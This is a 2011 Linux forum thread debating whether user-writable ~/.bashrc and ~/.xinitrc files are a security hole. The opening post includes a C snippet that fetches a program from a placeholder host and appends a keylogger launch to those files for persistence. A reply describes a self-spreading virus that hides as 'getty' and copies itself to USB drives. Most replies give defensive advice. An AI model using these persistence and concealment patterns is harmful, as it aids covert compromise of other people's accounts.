---
title: "Perhaps a security flaw, Perhaps not"
date: 2011-08-15
forum: Security
---

### Post by blackcobra on 2011-08-15
~/.bashrc ~/.xinitrc and all sh files by default on linux distributions do not require a password. Say takes the average person 2 minutes to go to the toilet, during which, he leave his computer logged in. what can be done in two minutes? ans: an awful lot. 

Say that I have written code, compiled and upload it onto a server. I can download this code onto a users computer in a matter of seconds.

for example, a compiled version of this c code:

```

#include <stdio.h>

main
{
// download a program to ~/.config (or where ever) using 
system("wgets http://somedomain.com/project ~/.config");

// append the ~/.bashrc
system("echo \"~/.config/project/./i-don't-know-a-keylogger\" >> ~/.bashrc "); 

//append the ~/.xinitrc
system("echo \"~/.config/project/./i-don't-know-a-keylogger\" >> ~/.xinitrc ");
}


```

note! pre-comipled!

What does this do?
basically, that user in his local home folder has now got a malicious program that boots every time he log in. Okay, to install programs globally requires sudo, but not locally. Say, that the user has a screen lock time of 5 minutes and does not have a keybinding to quickly lock his screen, or perhaps doesn't know the command to run to enable his screen lock. In 5 minutes somebody could destory everything in that users home folder, through the use of ls and rm! Maybe, somebody wants to humiliate somebody through the use crontab -e command, knowing full well that he has an important meeting a 5 o' clock on a certain date, and launch's chromium-browser into lemonparty.org a that precise moment. 
(don't go to that site by the way, visually disturbing)

Question: Do you trust everyone around you?

There are solutions!

1. Simply by default, chmod all sh files, the ~/.bashrc and ~/.xinitrc,
such that, these files cannot be changed by anyone, but, the system admin. If the user is not the admin, have a way contacting the admin so he can change it. ie. i suggest making these file read only for local users by default.

2. Backup, and run a diff on all the files. If diff is not equal to the NULL. user confirmation password. else rm the file and use backed up one.

So the next time you go for a **** "excuse my language" beware, lock your computer, because locally anything be installed while your away. 2 minutes, in terms of programming, is ages.

Yeah, some will think I'm paro, perhaps I am! A lot of friends are programmers, so I've every reason to be. On my computer, I completely stop programming, by not letting people into my bash without the uses of username and password (just a stupid ncurses login program), and uninstalling gui editors.  

By the way i'm a big fan of linux, and im not trying to dis it, its a wonderful operating system to work with, i've been using it for about 5 years, and I wouldn't use anything else. 

As in the title: Perhaps a security flaw, perhaps not, I'm opening this for discussion. I just want to find out if i'm the only one who thinks this is an issue?

---

### Post by haqking on 2011-08-15
The security flaw is leaving machine logged in when unattended.

That is Security Basics 101.

---

### Post by hakermania on 2011-08-15
Ofcourse it is a problem. I've created a virus that flood pings a site at 21/12/2012 (LOL haha) and uses ~/.config/autostart/ folder to autostart itself. It has itself moved to ~/.keyboard/getty every time it runs, in case somebody has captured it. Also, note the name 'getty', this way it can hide very well inside the system monitor because it gains a keyboard icon as the other 'getty' instances. The program itself creates the .desktop file which executes itself on boot and the folder in which to hide. All these don't require any special privileges :/ 

Also, another problem is that ~/.config/autostart/ can take hidden files and execute them as well, while the ~/.* directories don't usually contain hidden files, somebody searching for something malicious with much difficulty will search for hidden files inside ~/.config/autostart/, while the system executes them no matter if they are hidden or not.
The script also copies itself to /media/* (USBs etc) or to ~/.gvfs/*/ (network connections etc), if available of course, so as to spread.

Of course I didn't spread the virus, I created it only with the purpose to persuade a friend of mine that Ubuntu are not 100% safe and you have to be very careful what you run and what you don't.

So, linux is safe only if user is smart.

EDIT: This was my 1024 post!

---

### Post by mcduck on 2011-08-15
> **haqking said:**
> The security flaw is leaving machine logged in when unattended.

That is Secuerity Basics 101.

+1 to this.

Physical access to a computer should always be considered as root access to the system. If you don't protect your computer from that, your security is pretty much zero no matter what you do.

(encryption will help to protect your data if the computer is powered off at the moment, but somebody gaining access to running, unlocked system is a security breach no software mechanism can help with)

---

### Post by hakermania on 2011-08-15
Yes, the 1st post may speak about physical access, but anything you run that you're not sure about it can do such a job :/

---

### Post by Lars Noodén on 2011-08-15
Lock the screen if you leave the machine unattended.

---

### Post by haqking on 2011-08-15
> **hakermania said:**
> Yes, the 1st post may speak about physical access, but anything you run that you're not sure about it can do such a job :/

Again, security basics 101.

Why would you run something you are not sure about ?

This is all simple stuff, dont leave things logged in, dont run software/scripts or commands you are unsure about.

This is all well known

---

### Post by blackcobra on 2011-08-15
> **Lars Noodén said:**
> Lock the screen if you leave the machine unattended.

Personally i would not leave the computer without locking the screen. But not everyone know how to do that. Where we could simply chmod .xinitrc and .bashrc by default. Now point taking, yeah, every user should lock computer while there away. But if a user does not they probably don't know how to use these files in the first place!

---

### Post by hakermania on 2011-08-15
> **haqking said:**
> Again, security basics 101.

Why would you run something you are not sure about ?

This is all simple stuff, dont leave things logged in, dont run software/scripts or commands you are unsure about.

This is all well known
Agree, note to my previous post:

*So, linux is safe only if user is smart.*

---

### Post by haqking on 2011-08-15
> **hakermania said:**
> Agree, note to my previous post:

*So, linux is safe only if user is smart.*

indeed.

Same goes for bank accounts, house security, personal belongings.

If you leave car unlocked, wallet by open window, write ATM pin down...security all falls apart.

The biggest Security vulnerability has always been and will always be the User.

Hence Security Awareness training is always needed, you cant control if it is effective or if they use it but you can give it.

Not even god can control Free will or stupidity ;-)

---

### Post by blackcobra on 2011-08-15
I agree with you all totally. Don't leave the computer log in and lock your screen. But honestly, have you ever allowed someone to go the internet on your computer, to go onto facebook or whatever! Each time you do, we are putting ourself at risk. It would takes only a couple of seconds! Can you all honestly say you have never left you computer for a moment.

Can you say that your friends would not do this to you for a laugh?  

perhaps I have bad friends...  (I like them)
In my case, if they found a security flaw they would.

---

### Post by haqking on 2011-08-15
> **blackcobra said:**
> I agree with you all totally. Don't leave the computer log in and lock your screen. But honestly, have you ever allowed someone to go the internet on your computer, to go onto facebook or whatever! Each time you do, we are putting ourself at risk. It would takes only a couple of seconds! Can you all honestly say you have never left you computer for a moment.


NO i dont, if i did have a limited account for that purpose.

Least privelege at all times.

And yes i can say i never leave my system logged in when unattended.

---

### Post by blackcobra on 2011-08-15
So idea is, don't be stupid, and don't hire stupid people. Some people are stupid. Bash can do to much to allow stupid people to use it.  Look I just don't think, a local user should have access to those files. The users security should be in the hand of the admin

---

### Post by mcduck on 2011-08-15
> **blackcobra said:**
> So idea is, don't be stupid, and don't hire stupid people. Some people are stupid. Bash can do to much to allow stupid people to use it.  Look I just don't think, a local user should have access to those files. The users security should be in the hand of the admin

of course a local user should have access to them, just like a local user should have access to all the other personal setting files. 

The files are used for *user-specific* settings, so it only make sense for user to be able to change his own settings.
Security-wise the flaw here is leaving the system unattended and unlocked. And in that situation the permissions of these files is irrelevant, as there are countless amounts of nasty things that can be done to such an account. The solution is of course not to remove all permissions from the user (which would pretty much make the system useless) but to simply lock the system when not using it.

---

### Post by blackcobra on 2011-08-15
Okay, say i create a guess user, so somebody come logs in, enters the bash and does what likes to all other users that log on as the guest user. at lest notify the admin of such changes!

---

### Post by blackcobra on 2011-08-15
Well I suppose I'm a little paro, I think that it at lest should be a option when creating a new user. Which of course, it still is an option that can still be enabled. You all have probably guested, I'll be making these files read only as its completely up to me. 

seems not to be a security flaw.

And that why linux is deadly...

---

### Post by haqking on 2011-08-15
> **blackcobra said:**
> Okay, say i create a guess user, so somebody come logs in, enters the bash and does what likes to all other users that log on as the guest user. at lest notify the admin of such changes!

A user cant do what he likes to other users settings.

If they change settings pertaining to the guest user account which is used by other people then that comes down to bad admin.

Create multiple user accounts if you have multiple users logging on regularly.

remember that most of what you are saying is "what if's" and comes down to what if you are a bad admin...well guess what, bad things happen ! ;-)

Security is not a product, it is a process.  Security will only ever be as good as the user or sys admin administering the user

---

### Post by blackcobra on 2011-08-15
> **haqking said:**
> A user cant do what he likes to other users settings.

If they change settings pertaining to the guest user account which is used by other people then that comes down to bad admin.

Create multiple user accounts if you have multiple users logging on regularly.

remember that most of what you are saying is "what if's" and comes down to what if you are a bad admin...well guess what, bad things happen ! ;-)

Security is not a product, it is a process.  Security will only ever be as good as the user or sys admin administering the user

A linux system only as good as its admin. I'm stealing that line on you! I meant, a user account that does not require password, that any guess in my house, can use.

---

### Post by haqking on 2011-08-15
> **blackcobra said:**
> A linux system only as good as its admin. I'm stealing that line on you!

any system, not just Linux.

NO matter what the OS if you leave things logged in, run commands or scripts you are unsure of, install software from untrusted sources, dont run least privelege, create every user as an Admin, use simple or blank passwords, share passwords etc etc ad nauseum ad infinitum then it will be insecure.

---

### Post by blackcobra on 2011-08-15
I must say, I did enjoy this conversation. Ubuntu is still leading the way for new linux users. yes, I'm talking, "if's", i'm a computer coder. How else to we find things. As an admin, it should be all about the if's.

---

### Post by haqking on 2011-08-15
> **blackcobra said:**
> A linux system only as good as its admin. I'm stealing that line on you! I meant, a user account that does not require password, that any guess in my house, can use.

well once again it is common sense..DONT use blank passwords or auto logins.

If anyone can log on the it is the same if anyone can walk in your front door cos you leave it unlocked.

Physical access is root access

---

### Post by bodhi.zazen on 2011-08-15
I did not read the entire conversation but ...

1. As has been pointed out, physical access is root access.

2. Locking down files in a user's home directory makes no sense. Sure you code uses .bashrc, but it an intruder has shell access they do not need to use .bashrc, there are many ways they can leverage such access.

You might as well list bash or zsh or in fact all the shells as a security flaw, heck the ability to log in is a security hole.

Just lock down the computer so no one can log in, change all users shells to /bin/false.

3. What you should be looking at are things such as apparmor or selinux. With your mentality I would say selinux as it uses MAC and I doubt you are going to want to write a profile for each and every application.

---

### Post by mcduck on 2011-08-15
> **blackcobra said:**
> Okay, say i create a guess user, so somebody come logs in, enters the bash and does what likes to all other users that log on as the guest user. at lest notify the admin of such changes!

Use the guest session option that is launched from a logged-in user's desktop (it's in the shutdown/logout menu at the top right screen corner). That creates an new extremely limited guest user and wipes it out afterwards. And of course starting it requires confirmation from an actual user of the system, since that user must be logged in to start the guest session. This provides very good security both for you *and* the guest user, as none of the guest's browsing history etc. personal information is left behind.

Or if you want a guest user selectable from the login screen, create a simple automatic script to wipe that user's home at logout.

---

